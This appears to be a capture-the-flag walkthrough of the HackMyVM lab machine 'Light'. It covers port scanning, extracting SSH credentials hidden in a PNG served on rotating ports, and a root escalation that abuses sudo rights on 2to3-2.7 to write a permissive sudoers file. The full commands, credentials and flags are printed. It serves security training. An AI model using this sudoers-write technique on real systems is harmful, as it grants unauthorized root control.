# Light - HackMyVM Walkthrough

## Machine Information

| Category         | Value                       |
| ---------------- | --------------------------- |
| Platform         | HackMyVM                    |
| Machine Name     | Light                       |
| Difficulty       | Medium                      |
| Operating System | Linux                       |
| Objective        | Capture User and Root Flags |

---

# Initial Enumeration

Unlike most HackMyVM machines, this box does not provide an IP address in the banner.

We must first identify the target on the local network.

![image alt](q1)

---

## Discovering the Target

Using Netdiscover:

```bash
netdiscover -i eth1
```

After reviewing the results, we identify the target machine.

Target IP:

```text
192.168.56.124
```

![image alt](q2)

---

# Port Scanning

Now that we have the target IP, we begin reconnaissance.

```bash
nmap -p- --min-rate 5000 -T4 192.168.56.124
```

### Results

```text
PORT      STATE SERVICE
22/tcp    open  ssh
24411/tcp open  unknown
```

Interesting.

Only SSH and a strange high port are exposed.

---

## Service Enumeration

```bash
nmap -sCV -p22,24411 192.168.56.124
```

### Results

```text
22/tcp    open  ssh     OpenSSH 7.9p1 Debian
24411/tcp open  unknown
```

The strange service returns what appears to be PNG file data.

```text
.PNG........IHDR
```

This immediately suggests that the service is serving image content directly over TCP.

![image alt](q3)

---

# Initial Investigation

We attempted:

* Burp Suite
* Browser requests
* Netcat interaction

However the service returned no meaningful response.

The only clue remained the PNG header visible during Nmap fingerprinting.

![image alt](q4)

---

# Port Rotation Discovery

After rescanning the host, the previously discovered port disappeared.

A new port appeared:

```text
20549
```

Rescanning again revealed:

```text
33927
```

The service appears to rotate ports dynamically.

This suggests a challenge mechanic rather than a traditional network service.

![image alt](q5)

---

# Capturing the PNG

Eventually another port appeared.

Using Netcat:

```bash
nc -vn 192.168.56.124 35933 > received.png
```

Connection succeeds and data is saved locally.

However opening the image results in corruption errors.

The file is clearly not a normal PNG.

![image alt](q6)

---

# File Analysis

Since the PNG cannot be viewed normally, the next step is analyzing its contents.

Examining the file in hexadecimal format reveals hidden information.

The data is then reviewed using CyberChef.

This uncovers embedded credentials hidden within the image data.

![image alt](q7)

---

# Credential Discovery

Recovered credentials:

```text
lover : youcanseetheshadow
```

These credentials appear legitimate.

The obvious next step is SSH authentication.

![image alt](q8)

---

# Initial Access

Connect via SSH.

```bash
ssh lover@192.168.56.124
```

Password:

```text
youcanseetheshadow
```

Authentication succeeds.

Verify access:

```bash
whoami
```

Output:

```text
lover
```

---

# User Flag

Read the user flag.

```bash
cat user.txt
```

Output:

```text
iloveopenedports
```

User access obtained.

![image alt](q9)

---

# Privilege Escalation

Checking sudo permissions.

```bash
sudo -l
```

Output:

```text
User lover may run the following commands:

(ALL : ALL) NOPASSWD:
/usr/bin/2to3-2.7
```

Interesting.

The Python migration utility:

```text
2to3-2.7
```

can be executed as root without a password.

This immediately becomes our privilege escalation vector.

![image alt](q10)

---

# Exploiting 2to3

Create a custom sudoers entry.

```bash
echo -en 'lover\t\tALL=(ALL:ALL) NOPASSWD: ALL' > lover
```

This file grants unrestricted sudo access.

Now abuse 2to3 to write it into:

```text
/etc/sudoers.d/
```

Command:

```bash
sudo /usr/bin/2to3-2.7 \
-d \
-x NOFIX \
-n \
-W \
-o /etc/sudoers.d/ \
./lover
```

### Explanation

```text
-d
```

Process doctests only.

```text
-x NOFIX
```

Disable all fixers.

```text
-n
```

No backup file.

```text
-W
```

Write output even if no changes occur.

```text
-o
```

Write output to specified directory.

Because 2to3 runs as root, it writes our malicious sudoers file directly into:

```text
/etc/sudoers.d/
```

At this point:

```bash
sudo su
```

or

```bash
sudo bash
```

provides a root shell.

---

# Root Access

Verify:

```bash
whoami
```

Output:

```text
root
```

Read the root flag.

```bash
cat /root/root.txt
```

Output:

```text
ilovepython
```

Root compromise complete.

![image alt](q11)

---

# Flags

## User

```text
iloveopenedports
```

## Root

```text
ilovepython
```

---

# Attack Path Summary

```text
Netdiscover
      │
      ▼
Target Discovery
      │
      ▼
Nmap Enumeration
      │
      ▼
Strange PNG Service
      │
      ▼
Rotating Ports
      │
      ▼
Capture PNG
      │
      ▼
Hex Analysis
      │
      ▼
Credential Recovery
      │
      ▼
SSH Access
      │
      ▼
User Flag
      │
      ▼
sudo -l
      │
      ▼
2to3-2.7 Abuse
      │
      ▼
Write Malicious sudoers File
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Key Takeaways

* Not every service speaks HTTP; raw TCP services can hide valuable data.
* File signature analysis is extremely useful when dealing with unknown services.
* Hex inspection and CyberChef often reveal hidden content inside corrupted files.
* Dynamic or rotating ports can be intentionally used to slow down enumeration.
* Always investigate uncommon sudo permissions.
* GTFOBins remains an essential resource for Linux privilege escalation.
* Misconfigured file-writing utilities running as root can lead directly to full system compromise.

Machine rooted successfully.
